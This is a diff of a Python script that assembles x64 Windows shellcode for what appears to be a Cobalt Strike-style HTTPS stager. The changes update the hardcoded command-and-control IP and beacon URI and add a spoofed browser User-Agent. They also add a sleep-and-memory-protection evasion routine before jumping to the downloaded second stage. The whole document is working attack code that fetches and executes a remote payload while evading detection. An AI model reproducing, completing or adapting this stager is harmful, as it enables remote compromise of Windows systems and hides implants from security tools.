@@ -1,7 +1,7 @@
 """
-IP address at about line 227
-Port at about line 232
-Server URI (or search server uri) at about line 252
+IP address at line: 226
+Port at line: 231
+URI (or search beacon uri) at line: 251
 """
 
 import ctypes, struct
@@ -224,7 +224,7 @@ def main():
         "   mov rcx, rax                    ;"  # First arg, hInternet, handle obtained above
         "   xor rax, rax                    ;"  # Clear RAX
         "   push rax                        ;"  # NULL byte
-		"   mov rax, 0x30322e33             ;"  # EAX = \002.3
+		"   mov rax, 0x3830312e33           ;"  # EAX = 801.3
         "   push rax                        ;"  # Stack = \002.3
         "   mov rax, 0x2e3836312e323931     ;"  # RAX = .861.291
         "   push rax                        ;"  # Stack = \0801.3.861.291
@@ -249,67 +249,15 @@ def main():
         "   xor rdx, rdx                    ;"  # Second arg, lpszVerb, NULL
         "   push rdx                        ;"  # Alignment
         "   push rdx                        ;"  # NULL byte
-        "   mov rax, 0x524d4b4c52767547     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x7956636139374958     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x4c694b7339475f75     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x3757336f5f77524c     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x31782d7257624746     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x66557a334c4c426e     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x6c37506553426154     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x742d77412d327937     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x35347547664a6568     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x48757450305a7532     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x5068543048456376     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x5a6956436f584f41     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x33414c334869656e     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x68476855336a796b     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x5877327037724348     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x456a385752304b36     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x6a6c4d6149537a4e     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x527743594338574a     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x6767336d6a553058     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x444b576c75665a65     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x44744549724a7246     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x5f65524878746133     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x46737437614c735f     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x6b76545f6d4b2d6a     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x4e31676c53723549     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x635a6b584839716f     ;"
-        "   push rax                        ;"
-        "   mov rax, 0x5672624c36354d4c     ;"
+        "   mov rax, 0x596a57432f           ;"  # Beacon URI
         "   push rax                        ;"
         "   mov r8, rsp                     ;"  # Third arg, lpszObjectName
-        "   xor r9, r9                      ;"  # Fourth arg, lpszVersion
+        "   xor r9, r9                      ;"  # Fourth arg, lpszVersion, NULL
         "   push rdx                        ;"  # Eighth arg, dwContext, NULL
         "   xor rax, rax                    ;"
-        "   add rax, 0x60010000             ;"
+        "   add rax, 0x60210000             ;"
         "   add rax, 0x33206963             ;"
-        "   add rax, 0xfffffffff17ec89d     ;"  # Result: RAX = 0x84a03200, dwFlags
+        "   add rax, 0xfffffffff17ec89d     ;"  # Result: RAX = 0x84c03200, dwFlags
         "   push rax                        ;"  # Seventh arg, dwFlags, as follows
                                                 # INTERNET_FLAG_RELOAD | 0x80000000
                                                 # INTERNET_FLAG_SECURE | 0x00800000
@@ -317,7 +265,8 @@ def main():
                                                 # INTERNET_FLAG_NO_AUTO_REDIRECT | 0x00200000
                                                 # INTERNET_FLAG_IGNORE_CERT_CN_INVALID | 0x00001000
                                                 # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | 0x00002000
-                                                # INTERNET_FLAG_NO_UI 0x00000200                           
+                                                # INTERNET_FLAG_NO_UI 0x00000200 |
+                                                # XXX -> 0x200000
         "   push rdx                        ;"  # Sixth arg, lpszpszAcceptTypes, NULL, push rdx is only one byte, use that instead of push r9 (two bytes)
         "   push rdx                        ;"  # Fifth arg, lpszReferrer, NULL
         "   pop rdx                         ;"  # Useless
@@ -327,7 +276,7 @@ def main():
         "   test al, al                     ;"  # Check return
         "   jz call_terminate_process       ;"  # If NULL, terminate process
         "   mov [rbp+0x68], rax             ;"  # Save handle of request at [rbp+0x68]
-        "   add rsp, 0x1a8                   ;"  # Cleanup
+        "   add rsp, 0xd8                   ;"  # Cleanup
 
         " retry_counter:                    ;"  # Retry on send request fail
         "   push byte 0xa                   ;"  # Retry 10 times
@@ -354,25 +303,50 @@ def main():
         " call_httpsendrequesta:            "
         "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
         "   mov rcx, [rbp+0x68]             ;"  # First arg, hRequest
-        "   xor rdx, rdx                    ;"  # Second arg, lpszHeaders, NULL
-        "   xor r8, r8                      ;"  # Third arg, dwHeadersLength, NULL
+        "   mov rax, 0x2953                 ;"
+        "   push rax                        ;"
+        "   mov rax, 0x4a434c414d203b30     ;"
+        "   push rax                        ;"
+        "   mov rax, 0x2e352f746e656469     ;"
+        "   push rax                        ;"
+        "   mov rax, 0x7254203b3436574f     ;"
+        "   push rax                        ;"
+        "   mov rax, 0x57203b312e362054     ;"
+        "   push rax                        ;"
+        "   mov rax, 0x4e2073776f646e69     ;"
+        "   push rax                        ;"
+        "   mov rax, 0x57203b302e392045     ;"
+        "   push rax                        ;"
+        "   mov rax, 0x49534d203b656c62     ;"
+        "   push rax                        ;"
+        "   mov rax, 0x697461706d6f6328     ;"
+        "   push rax                        ;"
+        "   mov rax, 0x20302e352f616c6c     ;"
+        "   push rax                        ;"
+        "   mov rax, 0x697a6f4d203a746e     ;"
+        "   push rax                        ;"
+        "   mov rax, 0x6567412d72657355     ;"
+        "   push rax                        ;"
+        "   mov rdx, rsp                    ;"  # Second arg, lpszHeaders, the header in malleable config file
+                                                # User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALCJS) in this case
+        "   mov r8, 0xffffffffffffffff      ;"  # Third arg, dwHeadersLength, -1L
         "   xor r9, r9                      ;"  # Fourth arg, lpOptional, NULL
-        "   push rdx                        ;"  # Fifth arg, dwOptionalLength, NULL
+        "   push r9                         ;"  # Fifth arg, dwOptionalLength, NULL
         "   add rsp, 0xffffffffffffffe0     ;"  # Home space
         "   call qword ptr [rbp+0x58]       ;"  # Call HttpSendRequestA
-        "   add rsp, 0xa8                   ;"  # Cleanup
+        "   add rsp, 0x108                  ;"  # Cleanup
         "   test al, al                     ;"  # Check return
         "   jnz call_localalloc             ;"  # If success, proceed
 
         " retry:                            "   # If failed, retry 10 times
         "   dec rdi                         ;"  # Decrease counter
         "   jz call_terminate_process       ;"  # If failed 10 times, terminate process
-        "   jmp call_internetsetoptiona     ;"  # Retry
+        "   je call_internetsetoptiona     ;"  # Retry
         
         " call_localalloc:                  "   # Call LocalAlloc to allocate buffer for stage 2
         "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
         "   mov rcx, 0x40                   ;"  # First arg, uFlags, 0x40, LPTR
-        "   mov rdx, 0x40000                ;"  # Second arg, uBytes
+        "   mov rdx, 0x80000                ;"  # Second arg, uBytes
         "   add rsp, 0xffffffffffffffe0     ;"  # Home space
         "   call qword ptr [rbp+0x28]       ;"  # Call LocalAlloc
         "   test eax, eax                   ;"  # Check return
@@ -384,6 +358,7 @@ def main():
         "   xor r15, r15                    ;"  # Count total size of stage 2
         "   mov r14, rax                    ;"  # Save stage 2 buffer address to R14
         "   mov r13, rax                    ;"  # R13 serves as offset into the buffer
+        "   add r13, 0x1000                 ;"  # Offset one page
         "   push r15                        ;"  # Alignment
         "   mov rsi, rsp                    ;"  # RSI serves as lpdwNumberOfBytesRead
       
@@ -411,7 +386,8 @@ def main():
         " call_virtual_protect:             "   # Change mem protection to RWX
         "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
         "   mov rcx, r14                    ;"  # First arg, lpAddress
-        "   mov rdx, r15                    ;"  # Second arg, dwSize, 0x40000?
+        "   add r15, 0x2000                 ;"  # Include the evasion code
+        "   mov rdx, r15                    ;"  # Second arg, dwSize, 0x80000?
         "   mov r8, rax                     ;"  # Third arg, flNewProtect, PAGE_EXECUTE_READWRITE, RX will fail because the stager will write to mem space, so, RWX is a must
         "   mov r9, rsp                     ;"
         "   sub r9, 0x10                    ;"  # Fourth arg, lpflOldProtect
@@ -431,9 +407,50 @@ def main():
         "nop                                ;"
         "nop                                ;"
         "nop                                ;"
+        
+        " prep_stage_2:                     "
 
+        # ====== VirtualProtect PAGE_NOACCESS =======
+        "   mov rsi, 0x4cf1894c80c48348     ;"
+        "   mov [r14], rsi                  ;"
+        "   mov rsi, 0xe18949c08949fa89     ;"
+        "   mov [r14+0x8], rsi              ;"
+        "   mov rsi, 0xe0c4834810e98349     ;"
+        "   mov [r14+0x10], rsi             ;"
+        "   mov rsi, 0xa0c481483055ff       ;"
+        "   mov [r14+0x18], rsi             ;"
+        
+        # ================= Sleep 10 =================
+        "   mov rsi, 0x66c9314880c48348     ;"
+        "   mov [r14+0x22], rsi             ;"
+        "   mov rsi, 0xffe0c483482710b9     ;"
+        "   mov [r14+0x2a], rsi             ;"
+        "   mov rsi, 0xa0c481487055         ;"
+        "   mov [r14+0x32], rsi             ;"
+        
+        # == VirtualProtect PAGE_EXECUTE_READWRITE ===
+        "   mov rsi, 0x894c80c483484004     ;"
+        "   mov [r14+0x3b], rsi             ;"
+        "   mov rsi, 0x49c08949fa894cf1     ;"
+        "   mov [r14+0x43], rsi             ;"
+        "   mov rsi, 0x834810e98349e189     ;"
+        "   mov [r14+0x4b], rsi             ;"
+        "   mov rsi, 0xc481483055ffe0c4     ;"
+        "   mov [r14+0x53], rsi             ;"
+        "   mov rsi, 0xa0                   ;"
+        "   mov [r14+0x5b], rsi             ;"
+        
+        # ================== Jmp R14 ==================
+        "   mov rsi, 0xe6ff41               ;"
+        "   mov [r14+0x5f], rsi             ;"
+        
+        # =================== Set up ===================
+        "   mov r13, r14                    ;"  # R13 points to buffer now
+        "   mov al, 0x1                     ;"  # PAGE_NOACCESS
+        "   add r14, 0x1000                 ;"  # Start of stage 2 where to mark as PAGE_NOACCESS
+         
         " execute:                          "
-        "   jmp r14                         ;"  # Execute
+        "   jmp r13                         ;"  # Execute
         
         "nop                                ;"
         "nop                                ;"
